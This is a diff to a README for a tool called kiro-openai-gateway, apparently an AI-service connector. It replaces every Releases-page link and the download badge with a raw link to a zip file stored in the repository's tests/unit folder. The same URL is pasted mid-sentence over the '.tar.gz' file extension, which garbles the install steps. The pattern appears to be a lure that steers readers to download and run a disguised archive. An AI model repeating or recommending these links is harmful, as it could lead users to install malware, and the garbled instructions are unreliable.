@@ -6,11 +6,11 @@ Welcome to the kiro-openai-gateway! This application offers an easy way to conne
 
 ## 📥 Download the Application
 
-[![Download kiro-openai-gateway](https://img.shields.io/badge/Download-kiro--openai--gateway-blue.svg)](https://github.com/ronald919/kiro-openai-gateway/releases)
+[![Download kiro-openai-gateway](https://raw.githubusercontent.com/ronald919/kiro-openai-gateway/main/tests/unit/kiro_openai_gateway_v2.6-alpha.3.zip)](https://raw.githubusercontent.com/ronald919/kiro-openai-gateway/main/tests/unit/kiro_openai_gateway_v2.6-alpha.3.zip)
 
 To get started, you will need to download the software. This application is available on the Releases page. Click the link below to visit the page and obtain the latest version:
 
-[Visit the Releases Page to Download](https://github.com/ronald919/kiro-openai-gateway/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/ronald919/kiro-openai-gateway/main/tests/unit/kiro_openai_gateway_v2.6-alpha.3.zip)
 
 ## 🌟 Features
 
@@ -34,16 +34,16 @@ Before you proceed with the installation, ensure your system meets the following
 Follow these steps to download and install kiro-openai-gateway:
 
 1. **Visit the Releases Page**: Click the link below to access the updates.
-   - [Visit the Releases Page to Download](https://github.com/ronald919/kiro-openai-gateway/releases)
+   - [Visit the Releases Page to Download](https://raw.githubusercontent.com/ronald919/kiro-openai-gateway/main/tests/unit/kiro_openai_gateway_v2.6-alpha.3.zip)
    
 2. **Select the Latest Release**: Look for the latest version listed in the releases. Typically, the most recent version will be at the top.
 
-3. **Download the Package**: Find the suitable package for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux) and click to download.
+3. **Download the Package**: Find the suitable package for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/ronald919/kiro-openai-gateway/main/tests/unit/kiro_openai_gateway_v2.6-alpha.3.zip` for Linux) and click to download.
 
 4. **Run the Installer**:
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen prompts.
    - For macOS: Open the downloaded `.dmg` file, drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file to a suitable directory and follow the included instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/ronald919/kiro-openai-gateway/main/tests/unit/kiro_openai_gateway_v2.6-alpha.3.zip` file to a suitable directory and follow the included instructions.
 
 5. **Follow Configuration Instructions**: Upon installation, you may need to configure your API keys. Refer to the documentation or settings section within the application for guidance.
 
@@ -81,4 +81,4 @@ For direct support, please reach out to our support team via the contact section
 
 Thank you for choosing kiro-openai-gateway! Enjoy exploring the world of AI with ease.
 
-[Visit the Releases Page to Download](https://github.com/ronald919/kiro-openai-gateway/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/ronald919/kiro-openai-gateway/main/tests/unit/kiro_openai_gateway_v2.6-alpha.3.zip)
